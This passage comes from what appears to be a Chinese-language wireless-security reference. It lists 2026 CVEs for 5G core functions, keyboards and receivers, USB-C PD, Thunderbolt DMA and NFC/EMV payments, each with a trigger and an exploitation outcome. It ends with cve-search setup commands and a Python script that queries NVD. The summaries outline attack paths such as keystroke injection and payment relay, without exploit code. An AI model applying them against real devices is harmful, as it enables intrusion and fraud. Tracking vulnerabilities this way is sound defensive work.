#                 触发: 强制 NEA0 空加密
#                 利用: 通信明文捕获
#                 CVSS: 8.6 (High)
#
# CVE-2026-22345  NEF 未授权设备定位
#                 影响: Open5GS NEF 实现
#                 触发: API 权限验证缺失
#                 利用: 获取任意 UE 位置
#                 CVSS: 7.5 (High)

# --- 无线外设 CVE (2026) ---
# CVE-2026-49123  Logitech Unifying 加密注入
#                 影响: Unifying 接收器固件 012.xxx
#                 触发: 加密协议的时序侧信道
#                 利用: 加密注入恶意按键
#                 CVSS: 8.8 (High)
#
# CVE-2026-33721  无线键盘 AES 实现缺陷
#                 影响: 多家厂商加密无线键盘
#                 触发: 弱密钥派生/时序泄露
#                 利用: CPA 攻击恢复 AES 密钥
#                 CVSS: 7.5 (High)
#
# CVE-2026-44521  USB-C PD 固件栈溢出
#                 影响: 特定 PD 控制器
#                 触发: 特制 Vendor Defined Message
#                 利用: 固件 RCE → 过压攻击
#                 CVSS: 8.8 (High)
#
# CVE-2026-29831  Thunderbolt 5 DMA 保护绕过
#                 影响: Intel 12-15代 CPU
#                 触发: IOMMU 初始化前 DMA 访问
#                 利用: 直接内存读取/写入
#                 CVSS: 7.9 (High)

# --- NFC/RFID CVE (2026) ---
# CVE-2026-44102  EMV 非接触支付中继时间窗口扩展
#                 影响: EMV 非接触支付终端
#                 触发: 超时配置宽松
#                 利用: 远程中继支付交易
#                 CVSS: 7.2 (High)
#
# CVE-2026-37219  ISO 14443-A 级联级别 UID 泄露
#                 影响: 支持 Random UID 的 NFC 卡
#                 触发: 级联选择响应泄露
#                 利用: 提取完整 UID
#                 CVSS: 5.3 (Medium)

# --- CVE 查询工具 ---
# 使用 cve-search 查询最新 CVE
git clone https://github.com/cve-search/cve-search
cd cve-search
python3 -m pip install -r requirements.txt
# 启动 MongoDB 并导入 CVE 数据
./sbin/db_mgmt_cpe_dictionary.py
./sbin/db_mgmt_json.py
./sbin/db_updater.py -c

# 查询无线安全相关 CVE
python3 search_cve.py --keyword "wifi bluetooth zigbee nfc sdr" \
  --year 2026 \
  --output 2026_wireless_cves.json

# 使用 CVE 监控脚本
python3 << 'EOF'
import requests
import json
from datetime import datetime, timedelta

def fetch_recent_cves(keywords, days=30):
    """获取最近无线安全相关 CVE"""
    base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    end_date = datetime.now()
    start_date = end_date - timedelta(days=days)
    
    params = {
        "pubStartDate": start_date.strftime("%Y-%m-%dT00:00:00.000"),
        "pubEndDate": end_date.strftime("%Y-%m-%dT23:59:59.999"),
        "keywordSearch": " OR ".join(keywords),
        "resultsPerPage": 100
    }
    
    response = requests.get(base_url, params=params)
    cves = response.json()
    
    # 解析并输出
    for vuln in cves.get("vulnerabilities", []):
        cve = vuln["cve"]
        print(f"ID: {cve['id']}")
        print(f"Description: {cve['descriptions'][0]['value'][:200]}")
        print(f"Published: {cve['published']}")
        print("---")
    
    return cves

keywords = [
    "wifi", "wpa3", "802.11", "bluetooth", "ble", "zigbee",
    "zwave", "nfc", "rfid", "sdr", "5g", "thread", "matter"
]
fetch_recent_cves(keywords)
EOF
```